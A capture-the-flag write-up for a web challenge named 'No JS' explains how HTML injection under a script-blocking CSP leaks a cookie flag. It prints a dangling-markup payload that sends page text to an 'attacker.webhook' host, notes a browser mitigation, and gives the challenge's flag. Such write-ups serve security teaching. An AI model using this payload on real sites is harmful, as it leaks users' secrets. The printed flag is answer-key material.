# No JS

[日本語はこちら](./README-ja.md)

## Description

Can you leak a flag without Javascript?

## Writeup

### Overview

The goal of this challenge is to leak the value of `flag`. 

```python
@app.get("/")
def index():
    username = request.args.get("username", "guest")
    flag = request.cookies.get("flag", "no_flag")
    html = """<!doctype html>
<html>
<head>
    <meta charset="utf-8">
</head>
<body>
    <p>Hello [[username]]!</p>
    <p>Your flag is here: [[flag]]</p>
    <form>
        <input name="username" placeholder="What's your name?"><br>
        <button type="submit">Render</button>
    </form>
</body></html>"""
    # Remove spaces/linebreaks
    html = re.sub(r">\s+<", "><", html)

    # Simple templating system
    # Since Javascript is disabled, we shouldn't need to worry about XSS, right?
    html = html.replace("[[flag]]", flag)
    html = html.replace("[[username]]", username)

    response = Response(html, mimetype="text/html")
    # This Content-Security-Policy (or CSP) header prevents any Javascript from running!
    response.headers["Content-Security-Policy"] = "script-src 'none'"
    return response
```

You can set `username` to any value, causing HTML injection. However, the Content-Security-Policy (CSP) prevents all JavaScript from running.

### Solution

There is no known way to bypass the CSP and execute JavaScript to get the flag.

To get straight to the point, the answer is:

```
<img src="http://attacker.webhook/?dangling=
```

When it gets rendered, the HTML looks like this:

```html
<img src="http://attacker.webhook/?dangling=!</p><p>Your flag is here: Alpaca{...}</p><form><input name="username" placeholder="What's your name?"> ...
```

In HTML, attribute values that begin with `"` continue until the next `"` appears. Because our payload ends midway through the `src` attribute's URL, the subsequent text is treated as part of that URL until the closing `"`, and that text includes the flag. If you set the URL host to your server, the flag will be sent to you!

This is called **Dangling Markup Injection** attack.

### Small note

At first glance, you might think this line isn't necessary.

```python
html = re.sub(r">\s+<", "><", html)
```

However, if you remove it, you will find that the dangling markup injection will stop working.

This is because Chromium has a mechanism to prevent dangling markup injection attacks. If the URL contains both a newline `\n` and a less-than sign `<`, the browser will block that request. Keep this in mind if dangling markup injection did not work in another challenge!

## Flag

`Alpaca{XSS_is_not_the_only_client_side_vulnerability}`
